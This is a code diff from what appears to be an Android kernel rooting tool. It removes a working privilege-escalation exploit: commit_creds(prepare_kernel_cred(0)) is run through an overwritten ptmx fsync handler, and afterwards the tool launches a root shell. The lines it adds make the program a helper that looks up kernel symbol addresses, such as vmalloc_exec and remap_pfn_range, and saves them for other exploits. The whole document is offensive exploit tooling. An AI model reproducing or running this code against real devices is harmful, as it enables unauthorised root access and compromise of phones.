@@ -18,37 +18,7 @@
 #include "libexploit/exploit.h"
 #include "libkallsyms/kallsyms_in_memory.h"
 
-void
-obtain_root_privilege(void)
-{
-  commit_creds(prepare_kernel_cred(0));
-}
-
-static bool
-run_obtain_root_privilege(void *user_data)
-{
-  int fd;
-  int ret;
-
-  fd = open(PTMX_DEVICE, O_WRONLY);
-  ret = fsync(fd);
-  close(fd);
-
-  return (ret == 0);
-}
-
-static bool
-run_exploit(void)
-{
-  setup_ptmx_fops_fsync_address();
-  if (!ptmx_fops_fsync_address) {
-    return false;
-  }
-
-  return attempt_exploit(ptmx_fops_fsync_address,
-                         (unsigned long int)&obtain_root_privilege, 0,
-                         run_obtain_root_privilege, NULL);
-}
+static void *vmalloc_exec;
 
 void
 device_detected(void)
@@ -60,6 +30,36 @@ device_detected(void)
   __system_property_get("ro.build.display.id", build_id);
 
   printf("\n\nDevice detected: %s (%s)\n\n", device, build_id);
+}
+
+static bool
+has_all_essential_addresses(void)
+{
+  if (prepare_kernel_cred
+   && commit_creds
+   && remap_pfn_range
+   && vmalloc_exec
+   && ptmx_fops) {
+    return true;
+  }
+
+  return false;
+}
+
+bool
+setup_vmalloc_exec_address(void)
+{
+  if (vmalloc_exec) {
+    return true;
+  }
+
+  vmalloc_exec = (void *)device_get_symbol_address(DEVICE_SYMBOL(vmalloc_exec));
+
+  if (!vmalloc_exec && kallsyms_exist()) {
+    vmalloc_exec = (void *)kallsyms_get_symbol_address("vmalloc_exec");
+  }
+
+  return !!vmalloc_exec;
 }
 
 static bool
@@ -85,7 +85,8 @@ find_ptmx_fops_address(kallsyms *info, void *mem, size_t length)
   return setup_ptmx_fops_address_in_memory(mem, length, &hint);
 }
 
-bool find_variables_in_memory(void *mem, size_t length)
+static bool
+find_variables_in_memory(void *mem, size_t length)
 {
   kallsyms *info;
 
@@ -103,6 +104,14 @@ bool find_variables_in_memory(void *mem, size_t length)
       commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name(info, "commit_creds");
     }
 
+    if (!remap_pfn_range) {
+      remap_pfn_range = (void *)kallsyms_in_memory_lookup_name(info, "remap_pfn_range");
+    }
+
+    if (!vmalloc_exec) {
+      vmalloc_exec = (void *)kallsyms_in_memory_lookup_name(info, "vmalloc_exec");
+    }
+
     if (!ptmx_fops) {
       ptmx_fops = (void *)kallsyms_in_memory_lookup_name(info, "ptmx_fops");
 
@@ -113,7 +122,7 @@ bool find_variables_in_memory(void *mem, size_t length)
 
     kallsyms_in_memory_free(info);
 
-    if (prepare_kernel_cred && commit_creds && ptmx_fops) {
+    if (has_all_essential_addresses()) {
       return true;
     }
   }
@@ -121,17 +130,19 @@ bool find_variables_in_memory(void *mem, size_t length)
   setup_prepare_kernel_cred_address_in_memory(mem, length);
   setup_commit_creds_address_in_memory(mem, length);
 
-  return prepare_kernel_cred && commit_creds && ptmx_fops;
+  return has_all_essential_addresses();
 }
 
-bool
+static bool
 setup_variables(void)
 {
   setup_prepare_kernel_cred_address();
   setup_commit_creds_address();
+  setup_remap_pfn_range_address();
+  setup_vmalloc_exec_address();
   setup_ptmx_fops_address();
 
-  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
+  if (has_all_essential_addresses()) {
     return true;
   }
 
@@ -141,17 +152,7 @@ setup_variables(void)
     run_with_memcpy(find_variables_in_memory);
   }
 
-  if (prepare_kernel_cred && commit_creds && ptmx_fops) {
-    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
-    printf("  commit_creds = %p\n", commit_creds);
-    printf("  ptmx_fops = %p\n", ptmx_fops);
-
-#ifdef HAS_SET_SYMBOL_ADDRESS
-    device_set_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred), (unsigned long int)prepare_kernel_cred);
-    device_set_symbol_address(DEVICE_SYMBOL(commit_creds), (unsigned long int)commit_creds);
-    device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), (unsigned long int)ptmx_fops);
-#endif /* HAS_SET_SYMBOL_ADDRESS */
-
+  if (has_all_essential_addresses()) {
     return true;
   }
 
@@ -163,6 +164,14 @@ setup_variables(void)
     printf("Failed to get commit_creds address.\n");
   }
 
+  if (!remap_pfn_range) {
+    printf("Failed to get remap_pfn_range address.\n");
+  }
+
+  if (!vmalloc_exec) {
+    printf("Failed to get vmalloc_exec address.\n");
+  }
+
   if (!ptmx_fops) {
     printf("Failed to get ptmx_fops address.\n");
   }
@@ -172,19 +181,37 @@ setup_variables(void)
   return false;
 }
 
+static void
+register_address(void)
+{
+#ifdef HAS_SET_SYMBOL_ADDRESS
+  printf("Essential address are:\n");
+
+  if (device_set_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred), (unsigned long int)prepare_kernel_cred)) {
+    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
+  }
+
+  if (device_set_symbol_address(DEVICE_SYMBOL(commit_creds), (unsigned long int)commit_creds)) {
+    printf("  commit_creds = %p\n", commit_creds);
+  }
+
+  if (device_set_symbol_address(DEVICE_SYMBOL(remap_pfn_range), (unsigned long int)remap_pfn_range)) {
+    printf("  remap_pfn_range = %p\n", remap_pfn_range);
+  }
+
+  if (device_set_symbol_address(DEVICE_SYMBOL(vmalloc_exec), (unsigned long int)vmalloc_exec)) {
+    printf("  vmalloc_exec = %p\n", vmalloc_exec);
+  }
+
+  if (device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), (unsigned long int)ptmx_fops)) {
+    printf("  ptmx_fops = %p\n", ptmx_fops);
+  }
+#endif /* HAS_SET_SYMBOL_ADDRESS */
+}
+
 int
 main(int argc, char **argv)
 {
-  char* command = NULL;
-  int i;
-  for (i = 1; i < argc; i++) {
-    if (!strcmp(argv[i], "-c")) {
-      if (++i < argc) {
-        command = argv[i];
-      }
-    }
-  }
-
   device_detected();
 
   if (!setup_variables()) {
@@ -192,18 +219,7 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  run_exploit();
-
-  if (getuid() != 0) {
-    printf("Failed to obtain root privilege.\n");
-    exit(EXIT_FAILURE);
-  }
-
-  if (command == NULL) {
-    system("/system/bin/sh");
-  } else {
-    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
-  }
+  register_address();
 
   exit(EXIT_SUCCESS);
 }
